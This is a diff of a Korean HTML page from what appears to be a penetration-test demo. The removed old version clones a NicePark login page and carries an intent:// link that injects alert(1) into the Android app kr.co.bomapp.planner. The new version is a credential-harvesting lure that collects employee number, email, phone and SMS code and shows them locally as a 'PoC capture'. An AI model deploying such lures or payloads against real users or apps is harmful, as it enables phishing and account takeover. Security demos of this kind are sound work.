@@ -1,116 +1,176 @@
 <!DOCTYPE html>
 <html lang="ko">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>NicePark Login</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>계정 확인</title>
   <style>
+    * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
     body {
       margin: 0;
-      font-family: 'Arial', sans-serif;
-      background: url('https://cdn.nicepark.co.kr/images/MM/login_bg.jpg') no-repeat center center fixed;
-      background-size: cover;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
+      background: #ffffff;
+      font-family: -apple-system, BlinkMacSystemFont, "Apple SD Gothic Neo",
+                   "Malgun Gothic", "맑은 고딕", sans-serif;
+      color: #1a1a2e;
     }
-
-    .login-wrapper {
-      background: linear-gradient(to bottom, #114B9B, #092E64);
-      padding: 40px 30px;
-      border-radius: 20px;
-      width: 350px;
-      box-sizing: border-box;
-      box-shadow: 0 8px 16px rgba(0, 0, 0, 0.3);
-    }
-
-    .logo {
-      text-align: center;
-      margin-bottom: 20px;
-    }
-
-    .logo img {
-      width: 180px;
-    }
+    .wrap { max-width: 440px; margin: 0 auto; padding: 56px 24px 40px; }
 
     .title {
-      color: white;
       text-align: center;
-      font-size: 16px;
-      margin-bottom: 25px;
+      font-size: 22px;
+      font-weight: 800;
+      line-height: 1.4;
+      color: #14143a;
+      margin-bottom: 36px;
     }
 
-    input[type="text"],
-    input[type="password"] {
-      width: 100%;
-      padding: 12px;
-      margin-bottom: 12px;
-      border: none;
-      border-radius: 10px;
+    .label {
       font-size: 14px;
-      box-sizing: border-box;
+      font-weight: 700;
+      color: #222;
+      margin: 22px 0 8px;
     }
 
-    .options {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      font-size: 13px;
-      color: white;
-      margin-bottom: 15px;
-    }
-
-    .options input {
-      margin-right: 5px;
-    }
-
-    .reset-btn {
-      background: none;
-      border: none;
-      color: #cce0ff;
-      cursor: pointer;
-      font-size: 13px;
-      text-decoration: underline;
-    }
-
-    .login-btn {
+    .field {
       width: 100%;
-      background-color: #001BAA;
-      color: white;
-      padding: 14px;
+      padding: 15px 16px;
+      font-size: 15px;
+      color: #333;
+      background: #ffffff;
+      border: 1px solid #ececec;
+      border-radius: 11px;
+      outline: none;
+    }
+    .field::placeholder { color: #bdbdbd; }
+    .field:focus { border-color: #c9c9d6; }
+
+    .row { display: flex; gap: 8px; align-items: stretch; }
+    .row .field { flex: 1; }
+
+    .mini-btn {
+      flex: 0 0 auto;
+      padding: 0 16px;
+      font-size: 13px;
+      font-weight: 600;
+      color: #c4c4c4;
+      background: #f2f2f2;
       border: none;
-      border-radius: 10px;
-      font-size: 16px;
-      cursor: pointer;
-      font-weight: bold;
+      border-radius: 11px;
+      white-space: nowrap;
     }
 
-    .footer {
-      text-align: center;
-      color: #ddd;
-      font-size: 13px;
-      margin-top: 20px;
+    .field.muted { background: #f6f6f6; border-color: #eee; }
+
+    .next-btn {
+      width: 100%;
+      margin-top: 30px;
+      padding: 16px;
+      font-size: 15px;
+      font-weight: 700;
+      color: #c4c4c4;
+      background: #f2f2f2;
+      border: none;
+      border-radius: 11px;
+    }
+    .next-btn.active { color: #ffffff; background: #14143a; }
+
+    .ask-btn {
+      width: 100%;
+      margin-top: 12px;
+      padding: 15px;
+      font-size: 14px;
+      font-weight: 700;
+      color: #222;
+      background: #ffffff;
+      border: 1px solid #e5e5e5;
+      border-radius: 11px;
+    }
+
+    /* 데모 캡처 오버레이 (로컬 표시 전용, 전송 없음) */
+    .overlay {
+      display: none;
+      position: fixed; inset: 0;
+      background: rgba(0,0,0,.55);
+      align-items: center; justify-content: center;
+      padding: 24px;
+    }
+    .overlay.show { display: flex; }
+    .card {
+      background: #fff; border-radius: 14px; padding: 22px;
+      width: 100%; max-width: 360px;
+    }
+    .card h3 { margin: 0 0 12px; font-size: 16px; color: #14143a; }
+    .card pre {
+      background: #f6f6f8; border-radius: 8px; padding: 12px;
+      font-size: 12px; color: #333; white-space: pre-wrap; word-break: break-all; margin: 0 0 14px;
+    }
+    .card small { color: #999; font-size: 11px; }
+    .card button {
+      width: 100%; margin-top: 12px; padding: 12px;
+      border: none; border-radius: 10px; background: #14143a; color: #fff; font-weight: 700;
     }
   </style>
 </head>
 <body>
-  <div class="login-wrapper">
-    <div class="logo">
-      <img src="https://cdn.nicepark.co.kr/images/MM/login_logo.png" alt="NICEPARK 로고">
+  <div class="wrap">
+    <div class="title">계정 확인을 위해<br>정보를 입력해 주세요</div>
+
+    <div class="label">사번</div>
+    <input class="field" id="empno" type="text" placeholder="사번을 입력해 주세요." autocomplete="off">
+
+    <div class="label">이메일</div>
+    <input class="field" id="email" type="text" placeholder="이메일을 입력해 주세요." autocomplete="off">
+
+    <div class="label">휴대폰 번호</div>
+    <div class="row">
+      <input class="field" id="phone" type="tel" placeholder="휴대폰 번호를 입력해 주세요." autocomplete="off">
+      <button class="mini-btn" type="button">인증번호 받기</button>
     </div>
-    <div class="title">나이스파크 주차통합 관리 시스템</div>
-    <input type="text" placeholder="ID" />
-    <input type="password" placeholder="PW" />
-    <div class="options">
-      <label><input type="checkbox" /> ID저장</label>
-      <button class="reset-btn">비밀번호 초기화</button>
+    <div class="row" style="margin-top:8px;">
+      <input class="field muted" id="otp" type="tel" placeholder="인증번호를 입력해 주세요." autocomplete="off">
+      <button class="mini-btn" type="button">인증하기</button>
     </div>
-    <button class="login-btn">LOGIN</button>
-    <div class="footer">고객센터 1522-0741</div>
+
+    <button class="next-btn" id="next" type="button">다음</button>
+    <button class="ask-btn" type="button">로그인 정보 문의하기</button>
   </div>
-<a href="intent://app?x=1');alert(1);//#Intent;scheme=bmplanner;package=kr.co.bomapp.planner;end">
-  JS Injection PoC (alert)
-</a>
+
+  <!-- 데모 캡처 결과 (로컬 화면 표시 전용) -->
+  <div class="overlay" id="ov">
+    <div class="card">
+      <h3>[PoC] 입력 정보 캡처됨</h3>
+      <pre id="cap"></pre>
+      <small>모의해킹 데모용 · 외부 전송 없음(로컬 표시 전용)</small>
+      <button type="button" onclick="document.getElementById('ov').classList.remove('show')">닫기</button>
+    </div>
+  </div>
+
+  <script>
+    var ids = ['empno', 'email', 'phone'];
+    var next = document.getElementById('next');
+
+    function check() {
+      var filled = ids.every(function (id) {
+        return document.getElementById(id).value.trim() !== '';
+      });
+      next.classList.toggle('active', filled);
+    }
+    ids.forEach(function (id) {
+      document.getElementById(id).addEventListener('input', check);
+    });
+
+    next.addEventListener('click', function () {
+      // 실제 공격이라면 이 지점에서 입력값이 유출됨을 보여주는 데모.
+      // 본 실습본은 어떤 서버로도 전송하지 않고 로컬 화면에만 표시함.
+      var data = {
+        사번: document.getElementById('empno').value,
+        이메일: document.getElementById('email').value,
+        휴대폰: document.getElementById('phone').value,
+        인증번호: document.getElementById('otp').value
+      };
+      document.getElementById('cap').textContent = JSON.stringify(data, null, 2);
+      document.getElementById('ov').classList.add('show');
+    });
+  </script>
 </body>
 </html>
